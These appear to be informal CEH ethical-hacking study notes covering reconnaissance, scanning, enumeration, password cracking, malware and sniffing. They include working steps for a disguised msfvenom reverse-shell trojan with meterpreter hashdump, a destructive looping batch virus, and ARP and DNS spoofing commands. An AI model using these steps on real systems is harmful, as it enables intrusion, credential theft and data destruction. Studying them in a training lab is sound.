- Anatomy of URL -> Screenshot(1)

- Bit Flipping -> It is an attack on a cryptographic cipher in which the attacker can change the ciphertext in such a way as
  to result in a predictable change of the plaintext, although the attacker is not able to learn the plaintext itself. Note
  that this type of attack is not—directly—against the cipher itself, but against a particular message or series of messages.
  In the extreme, this could become a Denial of service attack against all messages on a particular channel using that cipher

- Hack value defines the value that whether something is worth doing it or not.

- Payload is the part of an exploit code that performs the intended malicious action. 

- In Daisy Chainning the attacker will not get the access of the particular machine but it can get an access to a machine in
 that environmnet so this way the attacker can now reach to the target machine by going through the machines linked to it.

- Leaking the PII(Personal Identity Information) of an individual. 

- A software has unknown weaknesses and the developer has currently no-day knowledge means no knowledge of it but the hacker
 knows it and most of the times sell it on Dark Net and exploit the software which comes as a surprise to the developer and
 patches r not available that soon or we can say that An attack that exploits the computer application vulnerabilites before
 the software developer releases a patch for that vulnerability.
 
- Bots r simple softwares that can be controlled remotely to automate attacks, Ex -> DDOS attacks

- Elemets of Security : CIA Traid -> Confidentiality -> Integreity -> Availability -> Authenticity -> Non-Repudation

- Non-Repudation -> It will not allow a person to deny from the work that person has done, such as a person can not deny that
  if he has sent the mail or not.
  
- Vectors -> The major regions of being attacked by somebody, Types ->
  - APT(Advanced Persistent Threads) ->  Anybody can write a malacious code or script which he can deploy to the victim
    machine or network which will be always being working in the background and victim doesn't know about it.
  - Botnet
  - Cloud Computing -> Service providers of cloud could have vulnerabilities themselves.
  - Insider Attack -> Betral by an employee itself
  - Mobile Threats
  - Viruses, Worms and Malwares
  
- Attack Types ->
  - OS
  - Misconfiguration -> Misconfriguration in program and devices
  - Application Level -> Such as it also contains Buffer flow
  - Shrink wrap / Defaults -> Using the default settings in the device or program.
  
  - Network Threats ->
	- Compromised key attack
	- DOS Attacks
	- DNS & ARP attacks
	- Firewall and IDS attack
	- Information Gathering
	- Password Based Attack
	- Spoofing, Sniffing, MITM attack
  
  - Host Threats ->
	- Arbitary Code Execution
	- Backdoor attack
	- DOS attack
	- Foot printing
	- Malware
	- Password
	- Physical security threads
	- Unathorized access
  
  - Application Threats ->
	- Authentcation and Authorization
	- Broken session management
	- Buffer overflow issue
	- Cyptography attack
	- Improper data / Input validation
  - and others....
  
- Five phases of hacking ->
  - Reconnaissance(Active or Passive) -> Gathering information of victim before hack, In Passive reconnaissance u gather
    information without leting victim know.
  - Scanning -> Scanning vulnerabilites(Port Scan, Network Scan)
  - Gaining Access -> Gain access on Victim compromised device/app
  - Maintain Access -> Attacker may use some tricks to maintain access on victim for long period
  - Clearing Tracks -> Clear all tracks so victim can't notice any attack
  
 - Information to gather while doing footprinting on Network
	- Access Control Mechanism and Access control list
	- Authentication Mechanism
	- Domain Name
	- IDS
	- Internal Domain Names
	- IP address of reachable system
	- Network blocks
	- Networking protocol
	- Private websites
	- Rogue websites
	- System enumeration
	- TCP and UDP services running
	- Telephone numbers
	- VPN Devices

 -  Information to gather while doing footprinting on System
	- Password
	- Remote system types
	- Routing tables
	- SNMP Information
	- System Architecture
	- System Banner
	- System Name
	- User and Group Name
	
- Information to gather while doing footprinting on Organzation
	- Employee details
	- Organization's website
	- Company Directory
	- Location Details
	- Address and Phone numbers
	- Comments in HTML source code
	- Security policies implemented
	- Web server links relevant to the organization
	- Background of the organization
	- News articles
	- Press releases
	
- "altoro mutual" this is a website which is build to do the Pentesting 

- "whois.sc" this website contains the info about the domain registrations, the registration date info, hackers some time
 buy the domains at the time of the expiration and then resale it to the company again at very high prices bcz they need that
 domain for their buissness.
- Attacker can also crack the email present in the registration info and use it take control of the website but to save them
 from it people provide the email of the ISP or network provider which is more secure.

- 'netcraft' website is used to know about the technology used by the website and also it's subsites, u can get the
  information about the organization of that website and its hosting info.

- Try to look for the career tab in a website so this way u get to know what technology stacks the target organizations r
  using.

- "way back machine" is a website which helps in collecting info or history of any website by going through snapshots of it.

- "Any who" is a website from were u can get the information about the person, also use the job websites for getting more
  information.

- Email harvest -> it is a tool which is present in the metasploit framework 
- kali terminal cmd -> msfconsole
  > use gather/search_email_collector 
  > show options // this is to show us all the options
  > set DOMAIN eccouncil.org	// to check for emails with the input domains
  > set OUTFILE file_name	// to get the result in some file
  > show options // this time to check if the changes r done
  > exploit // to gather all the emails related to target domain
	
- "Google Hacking" means that how efficiently we can use google to do our hacking tasks such as for reconnaissance.
- On google search use following syntaxs for better search ->
	- redmi note 5 -flipkart.com // this will not give the results from the flipkart.com
	- redmi note 5 -flipkart.com -mi.com // multiple website filtering for google search
	- redmi note 5 site:flipkart.com // this will give the result only from flipkart.com
	- Open google.com then go to settings and then Advance search and here u can set filters to do the search as u like
	- "Happy Message" this gives u the result for the both words combined otherwise the google would search and give the
	  results by searching seperatly for Happy and seperatly for Message.
	- For more search for -> google advanced search operator cheat sheet in google and download the pdf containing all
	  the syntax for the search tricks in google
	- U can do the mathematical calculations in the google search
	- inurl:eccouncil // this will only show the results in whose url the eccouncil is present, now days most of the webcams
	  are web based means online hence if we search the specific url for the webcam then we can access it same goes for
	  printer and other perifheral devices.
	  Ex: intitle: webcam 7 inurl: 8080 ,in google search and u will get the webcam results accordingly 
	- intitle:"Index Of" intext:.ftpconfig site:target_site // to find a file on the target website
	
- cve(common vulnerability and exploit) website provides the latest and previous vulnerabilites.

- 'securityfocus' website has a big library of vulnerabilites and not just explaining them but also provide exploits. 

- exploit-db.com // to know about vulnerabilites of certain databases and it also gives u the results on the basis of 
  ports, platforms, author etc.
- On exploit-db.com in the left panel, go to "GHDB" for better reconnaissance using google search techniques.
- We can also search for the vulnerable routers and get its access such as accessing router and gets the router location, 
  access webcams  

- Footprinting Recon Tools ->
- Firebug -> it's a extention for google chrome
- Web Data Extractor -> it is a tool used to retrive emails, mobile no etc from website
- HTTrack -> This helps u to download or we can say clone the complete website on ur local machine, this tool is already
  being avilable on Kali Linux OS
- webhttrack -> for getting graphical console of httrack

- Metagoofil Metadata Tool ->
- This tool can be used to do reconnaissance on victim website, it also uses the google database from the exploit-db.com -@@
- It gather and extract metadata of public docs, download the files from victim and at end it will generate a report
- This tool works on kali linux machine
- cmd -> apt-get install metagoofil
- cmd -> metagoofil
- cmd -> take the help of the example mentioned now in the terminal

- It's good to collect information of the people in the organization, for this we can use "pipl.com" website and just provide
 the name or email or any other data and it will search for u about people, other websites like this is 'zabasearch.com' but
 it is only related to US, it can also provide info such as background check and property check, use other sites also like
 'linkedin' to know the professional information about people.

- Maltego -> Do it from Zaid Pentesting for brief usage, Maltego is an intelligence tool which do the task of footprinting
 for which we use different websites and tools.

- Different tools give different results, so it's recommended to use mulitple tools for foot printing not just one.
- "internet archive" this website will show u the archives of a target even if that target website is removed or changed the
  website, it will also show u that how the website look like at that previous time and dates # CEH Exam imp
- If something new comes on a website and u wants instant update on it u can do this by using "alert" of google and 
  specifying the website their -> www.google.com/alerts, this will notify using email.

- For footprinting which is passive reconnaissance u do not need permission but for the network scanning which is active 
  reconnaissance u need permission. 
	
- Network scannning can be detected by IDS and Firewall but after a professional knowledge u can even escape these detections
	
- Email Recon Footprint ->
- This will help us to know the sender email address, sender IP address, sender location, network whois etc
- Email Header -> Always look for the header in email, which will help us to gather Names, Address(IP, Email), Mail Server,
  time stamps, Authentication and more.
- Tool to be used for this is 'Emailtrackerpro'.
- To get the header info go to the mail then to option More -> then to show original -> and then copy the whole header, just
  don't copy the html part.
- websites for same task -> ip2location.com, mailtrack.io, iptrackeronline.com, whatismyipaddress.com

- To know if the reciever has read the mail or not ->
- go to website -> 'didtheyreadit.com', enable this function in ur email whenever u send the mail and when the reciever
  open the mail it will give u the notifications that how many times the mail is opened, the location of reciever and how
  long it was open.
- even if u r sending an email to multiple people it will let u know that how many of them have read that email. 
	
- See netstat cmds in Os_cmds_&_Tips
- All the ports which r below 1024 r well known ports and u need to inspect ports above them, and these ports above 1024 if
  they r open on victims system then we can utilize them 
- Three way handshake in Google_Crash_Course_for_networking
- Screenshot(3) - TCP communication flags # CEH EXAM IMP
- Screenshot(4)- Scanning Methodolgy

Identifying Live Sytems -> Live host means the computer that is connected to the network
- ping ip_address // this is detectable, as it uses "icmp" or 'echo' protocol and if the victim has this protocol up and
 running he will reply back with the same amount of packets and same size but most firewall prevent them, if it is prevented
 then their will be no reply.
- nmap // do it from linux_networking, this is best tool considered for networking scanning.
- nmap -sn 192.168.50.1-254
- nmap was able to identify while ping does not bcz ping uses icmp protocol while nmap uses the ARP protocol, as ARP protocol
  is used to resolve IP to MAC address, Screenshot(5) -@@

Port Scanning -> By doing this u will be able to identify vulnerable ports and vulnerable services, we can also use nmap for
this task.
terminal 1 -> nmap -sT ip_address // also run the wirehark when u execute this cmd, here -T is doing vanilla scan, and it is 
detectable but cmd -> nmap ip_address //is not detectable as this doesnot complete the 3 way handshake and also known as syn
scanning or half open scan.

wireshark capture all the traffic going between the victim machine and hacker machine.
- On wireshark search for the port which are detected on the nmap, it will show that how the 3way handshake is done by nmap, 
So it shows that the 3 way handshake is done on each port by nmap to check whether the port is open or not, if a syn/ack is
recieved then that means the port is open -@@ 
- Now if the firewall checks out that a 3 way handshake is done and the firewall will block this IP. 

Advance Scanning Techniques ->
- To learn more about scanning go to -> nmap.org/book/man-port-scanning-techniques.html and u will find different types of
 scans with different flag usage in 3 way handshake
- X-mas scan cmd -> nmap -sX ip_address // this send FIN, PSH, URG packets only, see Screenshot(7) to understand working 
- if their is no response on the scan then that means the port is open -@@
- Fin scan working -> Screenshot(6)
- So different techniques and scans have different advantages.

To get more info on victim ->
- nmap -sV -A -O ip_address // -V will help to capture the banner which help identify the service running on machine, -A will
 make the scanning aggressive and give more info, -O is to identify the OS and other info such as versions, computer name
- the only problem with nmap is that it generate a lot of traffic and also could get the network down, So be carefull while
 using nmap
- nmap -sV -A -O ip_address > victim // to write the data in file. 

NMAP NSE Scripts-> these scripts help u to search for vulnerability, to do enumeration etc
- cd /usr/share/nmap/scripts/
- ls // to list these NSE scritps

Zenmap -> It is the graphical tool of nmap, here u will also get the topology which will make ur work more easier as it
 indicates that which one is more vunerable part in the network by indicating them.

Netcat -> It can scan, open a port, connect to a port, it can transfer file between different machine etc
cmd -> nc --help
machine 1 -> nc -lvp 5555 //-l for listening, v for verbose, p for port, by executing this cmd it will open port 5555 and
 start listening on that port
machine 2 -> nc machine_1_ip 5555 // after this the connection will be established between two machines
- by using netstat on machine 1 terminal 2 we can see that the connection is established
 
Grabbing Banner -> This means whenever u try to connect or open a port on another machine that has a service it will display
info about that service and this can be helpful to identify product or software on another machine, we can use netcat for
this task -@@
cmd attacker machine -> nc victim_ip port_no // this will tell u that what software is being used on victim machine for
particular port

Network Mapping -> We can draw a network map based on the information we collect from above network scans and tools.
- use solarwinds network mapping tool for this task, this is used by network administrators also to draw topologies and
 discover the info about the network

Vulnerability Scanning -> Screenshot(8), we can use tool "nesus home" for this, but it has the ability for only 20 to 25 IPs
Here we can define the policies for scan, it even give us the options for the type of scans we wants to do
- it will list all the vulnerability on the systems in the network and it will also provide the solution etc, but not how to
 exploit, we can use other websites for that.
 
Hiding Identity ->
Proxy Servers -> Screenshot(9) -@@, It's hard to find the identity of a hacker, We can use Tor browser for this task, tor
actually transfers ur data or request from multiple proxies(proxy chain) which makes it difficult to trace back the real user.
Tor browser will only hide when u r browsing some website but not if u r using system it won't help u.

To configure a local proxy server->
- We use a program "proxy workbench"
- download "proxy workbench" on machine 1, then run it on machine 1 // if we have this program on another machine also then
 we can also make a proxy chain -@@
- now connect to machine 2 //look through the tutorial video for configuration

Using Public Proxy ->
- We use a tool for this task "Proxy Switcher", it hides ur IP address from the websites u visit.
- Note -> Exam will have few questions about specific tool, they will ask what is this tool doing # CEH_exam_imp
- Exam could ask u about few tools and proxy switcher is one of them # CEH_exam_imp
- download "proxy switcher", u do not need to change any configuration for this
- a list will appear of the available proxy servers, and select one of them

Enumeration ->
- Screenshot(15), Screenshot(10) -@@, Screenshot(14) -@@ // cmds for enumeration on windows

NetBios Enumeration ->
- Screenshot(11) -@@, it is an old naming system and right now in naming system we r using DNS, A naming system is a service that
 resolve name to IP, NetBios is not used any more but it is still running on some machines bcz some of the services in
 Microsoft like sharing for instance or schedule task need to use NetBios to able to work effectively. -@@
- So on scanning a network if u find NetBios so then u can connect to that machine and connect to them 
- NetBios use specific ports which r 135, 139 and 445. So if any machine has those ports open then this is an indication that
 they have NetBios -@@
- run a network scan to search for netbios using zenmap or nmap
- on the systems with netbios on them
cmd -> nbtstat -A ip_of_machine_with_netbios // to get more info, go to the page of nbtstat so that u can understand the
abbrivations given in output
cmd -> net view \\ip_of_machine_with_netbios  // if the machine has any sharing it will show here, Screenshot(13)
 - u can also use tool "netbios enumerator" Screenshot(16), "winfingerprint" Screenshot(17)

SNMP(Simple Network Manage Protocol) Enumeration -> Screenshot(12)
- This SNMP protocol is needed on devices to be able to allow the adminstrator to manage them, U can find this protocol on
 CISCO router, on windows, on printers
- SNMP protocol have different version, ver1 and ver 2 were very vulnerable and the latest version(ver 3) was a patch
- If victim is using SNMP on his machine or on office devices such as router or a printer anything, u will be able to get
  tons of information and much more info then NetBIOS.
- On the system, router or printer on which SNMP is avilable or we can also install it. 
- In SNMP ver 1 and 2 the default settings contains the option in Security configuration as "Accept SNMP packets from any
  host"
- "snscan" this tool is used to scan every device computer router printer which has SNMP available. 
- after starting scan from 'snscan', it will find the port with 161 on devices as SNMP uses the port 161 // in tool we can
  also select other ports to scan as in options mentioned.
- on kali machine terminal 
- cmd -> msfconsole
  > search snmp	// this will search for snmp in it's database and give info for snmp, out of them all u will also find
                // auxiliary/scanner/snmp/snmp_enum_hp_laserjet
  > use auxiliary/scanner/snmp/snmp_enum_hp_laserjet
  > show options
- cmd -> set RHOSTS	ip_address //RHOSTS is the target address range or CIDR indetifier
  > show options // now u will see that the ip entered in above cmd is inserted in the options list
  > run          // now we will be able to see the hardware info, users on machine and many other informations.

DNS Enumeration ->
- "megacorpone.com" this is demo website for testing.
- DNS is a service that resolve name to IP 
- cmd On kali terminal -> host -t -ns website_name.com	// ns to get all the DNS services that support specific website, in
  the output u will get the DNS servers used to resolve IP realted to target website
- cmd On kali terminal -> host -t -mx website_name.com	// mx will list all the main services used by the target website
- cmd On kali terminal -> host www.website_name.com	    //  if it exists we will get the IP of the service
- cmd On kali terminal -> host portal.website_name.com	// to check or get the IP for portal host on website
- cmd On kali terminal -> host sharepoint.website_name.com	//  to check or get the IP for sharepoint host on website
- this all info will be used for future attack

DNS Zone Transfer ->
- Screenshot(18), DNS includes all the services name and their IP and they usually store those IP in something called Zone,
 So in DNS each Zone contains Name and IP which is a critical info but it will not lead to the full network compromization
 but it will help u to plan a successful attack.
- If DNS server crash no one will be able to access any website bcz their will not be anything to resolve from name to IP.
- So usally any network will have more then one DNS server.
- Between DNS server their will be a transfer of those zone, So if we have primary DNS and Secondary DNS and the primary DNS
  holds all the name and IP in one zone it will frequently copy this zone to another DNS, So if primary fails the secondary
  will take over and this process is called zone transfer.
- Many network administrators do not configure their DNS server properly in a way that any computer can communicate with a
  primary DNS and tell that I am ur secondary DNS could u plz send me a copy from the zone file for all the nameservice and
  IP and bcz it was not welcome, So the primary DNS can copy all the info to the Hacker machine assuming that hacker machine
  is a secondary DNS
- Now we will try to do a zone transfer -> 
- cmd On kali terminal -> host -t -ns website_name.com
- cmd On kali terminal -> host -l website_name.com DNS_name_server // this will try to ask to copy, try it untill any name
								// server allows u for transfer and u will get the all data from DNS.
													  
ENUM4Linux ->
- cmd On kali terminal -> apt-get install enum4linux
- cmd On kali terminal -> enum4linux -v ip_of_server_or_computer // this will try to info from that machine such as domain
  name, share info, OS, Users, group etc

System Hacking -> Screenshot(19), Screenshot(20), Screenshot(21), Screenshot(22)

Password Cracking -> Screenshot(23)

Types of Password Attacks -> Screenshot(24)
- In windows the location where the password of our system is stored is C Drive -> Windows -> System32 -> config -> SAM file
- In linux the location where the password of our system is stored is /etc/shadow

Active Online Attack -> Screenshot(25), Screenshot(26)
- We can also use the google help such as going to the article which mentions some of the most common passwords

Default Password -> Suppose we r able to get someone's public IP, their r services such as tracing email by the help of which
we can get the IP through mail, after getting the IP the attacker can paste it in the browser and on executing it he will be
able to go to the router, now see what kind of router it is such as D-link etc
- Now go to website such as "routerpasswords.com" and this website will show u all the default passwords in all router, most
 of the router will have more then one default account, so if u reset the password for the main account that doesnot mean the
 default router has been disabled and once u get the access to the router u won the game. Screenshot(27)

Tools for Cracking ->
- Such we will use Brute Force attack, Dictionary attack, rainbow table attack 
- If a website is blocking ur ip or blocked by countries for particular tool download try using public proxies
- tool "Cain & Abel" from oxid.it website // It is one of the best sniffering tools and password cracking, intercepting
 traffic, MITM attack
- Any antivirus will consider any hacking program as a malicious program so it will block it.
- Cain tool will also require 'wireshark' to work as wireshark uses WinPcap which is important for Cain to run.
- Cain can be used for Active, Passive and Offline attacks, In passive attack the attacker will not connect to the victim by
  any way
- Cain was developerd for windows xp so if we use it on the higher version OS then we need to do following settings
control panel > network and sharing center > change adapter settings > Ethernet (right click then "Properties") > 
Internet ProtocolVersion 4(TCP/IPv4) (Properties) > Advanced... > Under the heading "DNS suffix for the connection" tick both
the checkboxes which r Register the connection.... and Use the connection.... > now do the same for Internet Protocol
Version 6(TCP/IPv6) // Without these Setting changes the Cain will run but not work.
- Telnet is a program that allow user to connect remotely but now no one use Telnet bcz it sent and recieve in Plain text
  every one is now using remote connection via ssh.
- Bydefault telnet is not installed so u need to install it, for that go to manage on windows server vm > add role or feature
 > do next next untill u get to the feature screen and select Telnet and also start the Telnet from the settings
- Start the sniffer on the Cain // this will give u all the IPs and MAC address, OS type while sniffing the network 
- now go to APR option on the Cain // here we can do the interception or MITM attack
- select the computers among which u wants to see the interception, select them and allow the APR to do the work 
- now from kali terminal 
cmd -> telnet ip_of_machine_with_telnet
cmd -> enter the username as administrator and enter the password as complexpassword and now the connection will be
       established
- Now what is happening is that one machine is an attacker and the other 2 machines have established the connection, the 
attacker mackine is sniffing the passowrd, In side the attacker machine Cain go to the Telnet service option and u will see
that u can see the username and password and all the cmds and things exchanged between the connected machine
- and this is Passive Password attack

Xhydra ->
- cmd in kali -> nano test.txt // we r creating a wordlist
- cmd in kali -> xhydra  // this is the graphical interface of hydra
- enter the IP of target, enter the Port such as of Telnet, or any open port which u found
- then enter username
- try to get the proper usesname, if u don't get it try using common one such as administrator, guest, root, backup, user etc
, we can also create a userlist sameway u can do for the password.
- and then start the process // if the wordlist contains the right username and password then it will give the output which
 we can use to do the proper connection with telnet.

SSH cracking ->
- Althought ssh is used more but still in some home systems u will find that whole servcies r running on the router and this
 will include telnet 
- use the exact same settings from the above telent steps except change the port to 22 and the xhydra will crack the ssh
- now use the username and password u got after crack and try to establish the connection using ssh

Ncrack ->
- nmap -sS ip_of_server // this will show different services
- ms-wt-server is the service for microsoft remote desktop services, many server will allow this remote desktop protocol to
 be able to access server remotely, which means the server allow for remote desktop connection
- kali cmd terminal -> rdesktop -u Administrator ip_of_server	// -u is here for username, after executing this cmd u will
 see that it is asking for password, so now we need to crack the password 
- Ncrack is a tool that allow u to crack online passwords for different services
- try to get valid username it will be better
- cmd  kali -> ncrack -v -f --user administrator -P test.txt rdp://ip_of_server,CL=1 // here -v verbose,
, CL means try per time, -P is for wordlist passwords
- after cracking ncrack will tell the password if it is in wordlist
- now try to login into the server
- So ncrack is good tool but for it's proper working u need proper wordlist, it will work for http also just change from rdp
 to http

Ncrack different OS ->
cmd -> nmap -sS- o ip_of_server // now we r doing this on windows 7
cmd  kali -> ncrack -v -f --user User -P test.txt rdp://ip_of_server,CL=1

The right Word List ->
- To crack a password u need two things which is a valid username which u can get by enumeration or different tools and 2nd
 is a proper wordlist, inside kali linux u will find some word list in path /usr/shared/wordlists.
- For a Proper worlist we have 3 ways
1 - download some wordlist from the internet such as download 'darkC0de.txt' it has 40 million passwords so now the proper
  with it is it will take long time.
2 - create ur own wordlist, such as many people uses their mobile no. for their wifi passwords so we can take such sensable 
  examples, Crunch 
  cmd on kali -> crunch 3 5 -o /root/wordlist1.txt // here 3 is the min and 5 is the max limit letters, no.s, special 
  characters combinations
  cmd on kali -> crunch 4 4 0123456789 -t 01@@ -o /root/wordlist1.txt	// 0123456789 tells to use only them, -t helps to
  set the format so we r saying it should start from 01 and other two numbers could be anything
3 - The more effective word list -> After doing the reconnaissance on the victim, u need to combine the data such as taking
 the first 4 letters of his name, DoB, kid name etc and then generate different passwords related to that, for this task we
 can use a tool "cupp", cupp is the abrivation for common user password profile
 cmd kali -> apt-get install cupp
 cmd kali -> cupp -i  // then answer the questions asked by the tool regarding the victims footprint data, after answering
 all questions it will generate the wordlist accordingly

Password Reset Hack -> Screenshot(28)
- If u have an access to a physical machine and it's OS has a password, now to hack in this type of scenerio it comes in
  online attack, here online doesn't mean the internet but it's an active machine and attacker has access to machine
  physically.
- For above scenerio we will access an image and this image could be installed in USB or CD, then plug it to victim computer
  and then restart the machine and once it restart u will be able to restart a password
- We can use the tools such as 'PCUnlocker', which is paid tool, or u can use 'Hiren's Boot CD' , extract them and the image
  on the tool is ready to work
- To try this on virtual machine we need to go to the settings then CD-ROM of the virtual machine.
- When u start a Virtual machine usally it will start booting from the local harddrive it will not start booting from the
  CD-ROM.
- If it would be a physical machine then u need to just press f2 or esc buttons, So to start the vm from the CD-ROM we need
  to go to the places where those VMs r saved or installed then search for file their "*.vmx" open it using notepad and add
  one line in 2nd line of the file which is -> bios.bootdelay=7000 // then save the file, now start the virtual machine and
  u will see it will give u the time to go to the bios settings of the VM and then to the -> Enter setup -> Boot tab -> 
  CD-ROM Drive if u wants to use a CD -> or Hard Drive if u wants to boot it from the pendive and u will see that the tool
  is asking u to reset the password.
- So most of the hackers try to have these kinds of images on the flashdrive in hope if they got the chance to get the access
  to the machine physically they can just plug the drive and then just reset the password.

Offline Password Attack ->
- If the attacker is able to get the files that include all password from computer such as SAM file from windows machine, we
 can use Cain tool to open this SAM file.
- On Cain > Cracker > click '+' button > place the file path // and u will get the all the usernames and the passwords Hash
 values
- select the user name of which u wants to break the password then choose the type of attack u wants to perform on it such as
  Dictionary Attack, Brute Force Attack or Cryptanalysis Attack etc

Maleware -> 
- "wannacry" is a ransomware to which the Global financial losses around 4 billion dollars and same like it was "bad rabbit",
Screenshot(35)
- Types of Malware -> Screenshot(29), their r two categories spying(such as Trojan, keyloggers, backdoors etc) and damaging
(Virus, worm etc)
- Trojan Horse is one of the major syping application, it's concept is that u can send a malicious program to any victim and
 once victim open it u will have the control over the computer using a client software, So generaly a trojan horse consists
 of a virus or patch or server that u needs to send to the victim and once the victim runs u will have access to machine. 
 Ex-> Netbus Screenshot(30) and the other part u need a client software by using which u will have full access of machine but
 the catch is the victim must be running a patch or server running from his side, it's usually hidden in a regular program or
 file such as pdf file etc, Screenshot(36,37)

Common Ports used by Trojan -> Screenshot(38,39)

How to infect systems using trojan -> Screenshot(40,41,43)

- Ransom ware is a damaging application, it encrypt all the files on system and it not just target computers only it target
 any smart device. 

- Virus is damaging program, it may delete files, may format drive but not lead to leakage of data

- Worm is similar to virus except it get replicated to itself, as the virus will infect only one device while a worm will try
  to infect the other machines also in the network, Virus need something called hosting so virus will not be moving by itself
  or get hosted to another file or another program and worm does not need any hosting it will be moving by itself.

- Rootkit is a program that hide the real process in a sence that u may configure a rootkit in away that what u want a victim
 to see. So if u delete some file from victims computer or copy some file but u want the user to get the deleted file as fake
 file, this way the victim could got hacked but he doesn't know, Screenshot(31)

- Keylogger is a syping application, it just sends the victims key stroks to attacker through server or email. their r 2 
  types of keyploggers -> Software and Hardware, Software keyloggers r considered malware

- Adware, once it get installed on ur machine it will be used to show advertisements, it is not doing any damage it's just
  disturbing.
  
- Wrapper is like a technique to combine a virus or a malware with a regular program or file as it is easier to convience
  someone to download a file in comparision of downloading a software, Screenshot(44)
  
Different Ways Malware is spreaded -> Screenshot(32,33,34)

Create a Virus -> Screenshot(45), We will create it using simple dos cmds
@echo off	// This means that when this file get executed do not show the user it is executed
:Testvirus	// naming the program
start		// this will open another cmd line
start www.msn.com	// it will open the website
del C:\Test\*.* /q  // here we r deleting folder Test and all the types of files inside it, q is saying to work quitely
goto :Testvirus		// this will make the file work again, so it work frequently and consume ur all resources untill it crash

// save the file as file_name.bat

Creating a Virus using a Tool -> Screenshot(46)
- We can use tool such as "TeraBit Virus Maker", use the link given by the tutor only for this tool to download
- U can create complex virus using advance tools or u can use dos cmds to create simple virus

Creating a Trojan 1
- Most of the outbound traffic which is going from ur computer to internet is not restricted.
- Reverse Connection -> If an attacker send a Trojan to the victim, and if victim click on the trojan he will be got
 connected to the attacker and as the outbound traffic is not restricted, So this way we can use this to bypass the firewall
- kali cmd -> msfvenom	--help // this is used to create a payload
- kali cmd -> msfvenum -p windows/meterpreter/reverse_tcp LHOST=ip_of_attacker_system LPORT=4455 --format=exe > game.exe
// payload which could not be detected by firewall is we r putting here our IP bcz once the payload 
// is clicked we want a connection to our system, now the payload trojan game.exe is created and u just need to send it to
// the victim
// u can send this file through social engineering or other way a simple basic way would be to copy the file in the attacker
// location
// path -> var/wwww/html
cmd kali -> service apache2 start // this service make the kali machine work as web server
browser victim -> http://ip_of_Attacker/trojan_payloadname	// for this step u need to disable defender, for this task find
the windows defender then settings then clickon checkbox as "Turn on real-time protection", if the PC status becomes red then
that means the defender is disabled, u also need to turn off the security in browser so go to browser security and make sure
to uncheck the checkbox as "Enable Protected Mode"
// now the file would be able to download after all protection is disabled, this is just only for proof of concept to see the
trojan in action.
// u need to make the kali listening so that the attacker machine could listen from the victim via trojan     
- we need to start a database server that include all the exploits that will be used for this we use 
cmd kali -> service postgresql start // this is how we r starting a service in kali linux, if on the execution of this cmd it
didn't give any error then that means it is started
cmd kali -> msfconsole // this is to start a listener
	> use exploit/multi/handler
	> show options
	> set payload windows/meterpreter/reverse_tcp
	> set LHOST=ip_of_attacker_system
	> set LPORT=4455
	> show options
	> exploit	// now the listening will start
	
	// now we can execute the trojan from the victims side by executing the trojan in creating a Trojan 1 section


Can I bypass the AV ->
kali cmd -> meterpreter
> hashdump // this cmd is used to download all the password from the victim machine in encrypted format, even if those
 passwords r not deprevated u can used the encrypted password use 'passhash'
> getdesktop // this will give u the desktop of the victim
> download c:/file_name	// this will download the file to attacker machine, we can do multiple things from here such as open
 mic, webcam, keylogger etc

Sniffering ->
ARP request and ARP reply -> Screenshot(47)
- During the ARP request the machine or router who gets it will spoof the MAC address of the machine for which the ARP
 request was done, So now the switch gets the spoofed MAC address and Switch doesn't have any other way to validate that and
 this is called ARP spoofing.

ARP poisioning is done by sending the ARP reply to every machine without ARP request and this will make the all MAC address
table updated and this way the attacker machine will be able to pretend as the Router and all the traffic will be diverted to
this attacker machine.

To verify the ARP spoofing and Poinsioning -> cmd -> arp -a // this will tell u the table for the earlier ARP request and
reply and from here u can see the router MAC address

MITM Attack ->
- Attacker machine 1 -> Start Cain, then go to sniffer, click '+' button, selct All 'tests' checkbox // the router IP is
also needed as the MITM is going to between the victim machine and the router, So u need to know the gateway of the victim
machine which is the gateway of the router
- Attacker machine 1 -> In Cain go to APR, click '+', on the left side mention the victim machine IP and on the right side
mention the router IP or gateway IP, then start the APR, and once the traffic is going or coming from the victim to the
router it will be intercepted here, Status here is 'Full Routing' then that means the traffic is going and comming back
- Then go to the 'Password' traffic to see if the credentials were transfered in the traffic which would be have intercepted
, and based on the services options such as FTP, IMAP u can intercept traffic.
- U can also go to the VOIP option to intercept the traffic such as of skype.

Enable Routing -> Before starting any attack in kali linux u should do this setting changes as for the intercepting attacks
u need to enable routing in kali, if this not then the traffic will stop at ur machine from the victim machine.
kali terminal -> cd /proc/sys/net/ipv4
kali terminal -> nano ip_forward	// by default this file has setting as 0 so change it to 1
note -> check the value everytime u start the machine bcz may be it could change back to default value 0 once u shutdown the
machine.

MITM attack using Ettercap and Xplico -> This will not just intercept the packets but also change the content
kali terminal -> ettercap -G // this is to intercept the traffic, this cmd will start the ettercap GUI and from their go to
'Sniff' option and so on do the sniffing for the hosts and other settings to intercept the traffic, choose ARP poisioning
kali terminal -> service apache2 start // this is needed to start Xplico
kali terminal -> /etc/init.d/xplico start	// this path to start would have been given in xplico
username and password for xplico is xplico
In xplico create new case now if u have some traffic that has been captured u can use it as well or use the live option too
, then create a new session in xplico, once the capturing of traffic is done stop it and then , now go to WEB option in 
xplico and this will show the websites u searched, images, feed same u can do for the voip or email etc

u can use website such as certifiedhacker.com fro testing purposes

DNS Spoofing ->
It is like u replace the original IP of a domain with the attacker IP so that the user would we placed on attacker site.
To spoof -> 
kali terminal -> nano /etc/ettercap/etter.dns	
then add a line their as -> *.target_website.com A attacker_ip
kali terminal -> ettercap -T -q -M arp:remote -P dns_spoof	///  //this will implement this file to any traffic inside the 
network means every other victim on the network would be go to the attacker defined IP
on victim machine for windows ->ipconfig /release  	// their could be some info inside the cache so need to clear it
on victim machine for windows ->ipconfig /release  	// this will get u new IP and now the attack of DNS spoofing could be 
													// done successful
													
Cyptography ->
In malware analysis u will get to know that if u encrypt the virus u will be able to bypass the protection.
'Cryptool' is a powerfull tool for practicing cryptography
Cryptography r providing 2 different factor in security 
- Confidentiality
- Integreity

U can use cryptool for encrypt and decrypt, the encrypted text is called cipher text 
Caesar/ROT-13 algorithm is used by shifting the characters in text. this is symmetric encrypting.

Logorithms r public and key is the secret part
If u see the key lens is 96 bit that mean the randomization of this key is 2**96, but remember greater the power lens the
more processing will be needed.

Types of Cryptography -> Screenshot(53)

Symmetric encryption list -> Screenshot(54)

Symmetric Encryption issue ->
- Transportation as the cypher text and the key can't be send together bcz of the mail is compromised then it is not going
be of any use as the attacker would get the key.
- Number of keys -> Suppose if their r 4 people then each 2 people will need a seperate key, as suppose their r A, B, C so
the key between A and B would be different,key between B and C should be different and between A and C should be different.
